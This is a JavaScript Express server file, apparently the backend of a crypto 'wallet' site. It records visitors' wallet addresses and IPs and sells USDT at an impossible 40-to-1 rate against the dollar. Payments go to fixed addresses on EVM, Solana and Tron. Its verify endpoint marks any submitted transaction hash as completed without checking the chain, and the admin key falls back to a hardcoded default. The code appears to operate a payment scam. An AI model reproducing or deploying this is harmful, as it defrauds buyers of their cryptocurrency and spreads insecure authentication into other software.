import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Simple logger that doesn't create directories
const logger = {
  error: (msg, meta) => console.error('[ERROR]', msg, meta),
  warn: (msg, meta) => console.warn('[WARN]', msg, meta),
  info: (msg, meta) => console.log('[INFO]', msg, meta),
  debug: (msg, meta) => console.debug('[DEBUG]', msg, meta),
  middleware: (req, res, next) => next()
};

// Simple storage
const dataDir = path.join(__dirname, 'data');

function loadJSON(filename) {
  try {
    const filePath = path.join(dataDir, filename);
    if (!fs.existsSync(filePath)) return [];
    const data = fs.readFileSync(filePath, 'utf8');
    if (!data.trim()) return [];
    return JSON.parse(data);
  } catch (error) {
    console.error(`Error loading ${filename}:`, error.message);
    return [];
  }
}

function saveJSON(filename, data) {
  try {
    const filePath = path.join(dataDir, filename);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error(`Error saving ${filename}:`, error.message);
    return false;
  }
}

// CORS - allow your frontend domains
const allowedOrigins = [
  'https://meme-wallet-control-system.vercel.app',
  'https://meme-wallet-control-system-hx1r.vercel.app',
  'http://localhost:3000',
  'http://localhost:5173'
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware for consistent responses
app.use((req, res, next) => {
  res.jsonResponse = (success, data = null, error = null, statusCode = 200) => {
    const response = { success };
    if (data !== null) response.data = data;
    if (error !== null) response.error = error;
    return res.status(statusCode).json(response);
  };
  next();
});

// Helper functions
function calculateUSDTAmount(usdAmount) {
  const amount = parseFloat(usdAmount);
  if (amount === 20) return 1000;
  if (amount === 50) return 2500;
  if (amount === 100) return 5000;
  if (amount > 100) return Math.floor(amount * 40);
  return Math.floor(amount * 40);
}

function getReceivingAddress(chain) {
  const chainLower = chain.toLowerCase();
  if (['evm', 'eth', 'bnb', 'matic', 'polygon'].includes(chainLower)) {
    return '0xdb77c99f57d527b25a02760bd8dce833ba48dc46';
  }
  if (['sol', 'solana'].includes(chainLower)) {
    return '5zPETBCsny3sHcoHHQVybojxq5Qi2pGYUMJMmkA5KU8b';
  }
  if (['tron', 'trx'].includes(chainLower)) {
    return 'TAmhzoBrfV3Y5GmmSp4Ry3C56Nf2rVEdrr';
  }
  return null;
}

function getQRCodeBase64(chain) {
  try {
    const chainLower = chain.toLowerCase();
    let fileName = '';
    
    if (['evm', 'eth', 'bnb', 'matic', 'polygon'].includes(chainLower)) {
      fileName = 'evm.png';
    } else if (['sol', 'solana'].includes(chainLower)) {
      fileName = 'solana.png';
    } else if (['tron', 'trx'].includes(chainLower)) {
      fileName = 'tron.png';
    } else {
      return null;
    }
    
    const qrPath = path.join(__dirname, 'qr', fileName);
    if (fs.existsSync(qrPath)) {
      const imageBuffer = fs.readFileSync(qrPath);
      return `data:image/png;base64,${imageBuffer.toString('base64')}`;
    }
    
    return null;
  } catch (error) {
    console.error('QR error:', error.message);
    return null;
  }
}

// ========== PUBLIC ENDPOINTS ==========

// Health check
app.get('/', (req, res) => {
  res.jsonResponse(true, {
    service: 'Crypto Wallet API',
    version: '1.0.0',
    status: 'online',
    timestamp: new Date().toISOString()
  });
});

// GET /api/rates
app.get('/api/rates', (req, res) => {
  res.jsonResponse(true, { rate: 40 });
});

// POST /api/wallet/connect
app.post('/api/wallet/connect', (req, res) => {
  try {
    const { address, chain } = req.body;
    
    if (!address || !chain) {
      return res.jsonResponse(false, null, 'Address and chain are required', 400);
    }
    
    const wallets = loadJSON('wallets.json');
    const walletData = {
      address: address.toLowerCase(),
      chain: chain.toLowerCase(),
      connectedAt: new Date().toISOString(),
      lastActive: new Date().toISOString(),
      ip: req.ip
    };
    
    wallets.push(walletData);
    saveJSON('wallets.json', wallets);
    
    res.jsonResponse(true, {
      wallet: walletData,
      message: 'Wallet connected successfully'
    });
    
  } catch (error) {
    console.error('Wallet connect error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// GET /api/payment/details
app.get('/api/payment/details', (req, res) => {
  try {
    const { chain, usdAmount } = req.query;
    
    if (!chain || !usdAmount) {
      return res.jsonResponse(false, null, 'Chain and USD amount are required', 400);
    }
    
    const usdAmountNum = parseFloat(usdAmount);
    if (isNaN(usdAmountNum) || usdAmountNum <= 0) {
      return res.jsonResponse(false, null, 'Valid USD amount required', 400);
    }
    
    const receivingAddress = getReceivingAddress(chain);
    if (!receivingAddress) {
      return res.jsonResponse(false, null, 'Unsupported chain', 400);
    }
    
    const usdtAmount = calculateUSDTAmount(usdAmountNum);
    const transactionId = Date.now().toString();
    const qrCode = getQRCodeBase64(chain);
    
    // Save purchase
    const purchases = loadJSON('purchases.json');
    purchases.push({
      id: transactionId,
      chain: chain.toLowerCase(),
      usdAmount: usdAmountNum,
      usdtAmount,
      receivingAddress,
      status: 'pending',
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString() // 30 minutes
    });
    saveJSON('purchases.json', purchases);
    
    res.jsonResponse(true, {
      transactionId,
      chain: chain.toLowerCase(),
      receivingAddress,
      usdtAmount,
      usdAmount: usdAmountNum,
      qrCode,
      rate: 40
    });
    
  } catch (error) {
    console.error('Payment details error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// POST /api/payment/verify
app.post('/api/payment/verify', (req, res) => {
  try {
    const { transactionId, transactionHash, chain } = req.body;
    
    if (!transactionId || !transactionHash || !chain) {
      return res.jsonResponse(false, null, 'All fields are required', 400);
    }
    
    const purchases = loadJSON('purchases.json');
    const purchaseIndex = purchases.findIndex(p => p.id === transactionId);
    
    if (purchaseIndex === -1) {
      return res.jsonResponse(false, null, 'Transaction not found', 404);
    }
    
    const purchase = purchases[purchaseIndex];
    
    // Update purchase
    purchase.status = 'completed';
    purchase.verifiedAt = new Date().toISOString();
    purchase.transactionHash = transactionHash;
    
    // Save transaction
    const transactions = loadJSON('transactions.json');
    transactions.push({
      id: Date.now().toString(),
      purchaseId: transactionId,
      transactionHash,
      chain: chain.toLowerCase(),
      amountUSD: purchase.usdAmount,
      amountUSDT: purchase.usdtAmount,
      timestamp: new Date().toISOString(),
      status: 'completed'
    });
    
    saveJSON('purchases.json', purchases);
    saveJSON('transactions.json', transactions);
    
    res.jsonResponse(true, {
      verified: true,
      transactionId,
      usdtAmount: purchase.usdtAmount,
      message: 'Payment verified successfully'
    });
    
  } catch (error) {
    console.error('Payment verify error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// GET /api/qr/:chain
app.get('/api/qr/:chain', (req, res) => {
  try {
    const { chain } = req.params;
    const receivingAddress = getReceivingAddress(chain);
    
    if (!receivingAddress) {
      return res.jsonResponse(false, null, 'Unsupported chain', 400);
    }
    
    const qrCode = getQRCodeBase64(chain);
    
    if (!qrCode) {
      return res.jsonResponse(false, null, 'QR code not available', 404);
    }
    
    res.jsonResponse(true, {
      chain: chain.toLowerCase(),
      address: receivingAddress,
      qrCode,
      mimeType: 'image/png'
    });
    
  } catch (error) {
    console.error('QR endpoint error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin middleware
const adminMiddleware = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'];
  const validAdminKey = process.env.ADMIN_KEY || 'dev-admin-key-123';
  
  if (!adminKey || adminKey !== validAdminKey) {
    return res.jsonResponse(false, null, 'Unauthorized', 401);
  }
  next();
};

// GET /api/admin/purchases
app.get('/api/admin/purchases', adminMiddleware, (req, res) => {
  try {
    const purchases = loadJSON('purchases.json');
    res.jsonResponse(true, { purchases });
  } catch (error) {
    console.error('Admin purchases error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// GET /api/admin/transactions
app.get('/api/admin/transactions', adminMiddleware, (req, res) => {
  try {
    const transactions = loadJSON('transactions.json');
    res.jsonResponse(true, { transactions });
  } catch (error) {
    console.error('Admin transactions error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// GET /api/admin/wallets
app.get('/api/admin/wallets', adminMiddleware, (req, res) => {
  try {
    const wallets = loadJSON('wallets.json');
    res.jsonResponse(true, { wallets });
  } catch (error) {
    console.error('Admin wallets error:', error);
    res.jsonResponse(false, null, 'Internal server error', 500);
  }
});

// Error handlers
app.use('*', (req, res) => {
  res.jsonResponse(false, null, 'Endpoint not found', 404);
});

app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.jsonResponse(false, null, 'Internal server error', 500);
});

// Export for Vercel
export default app;
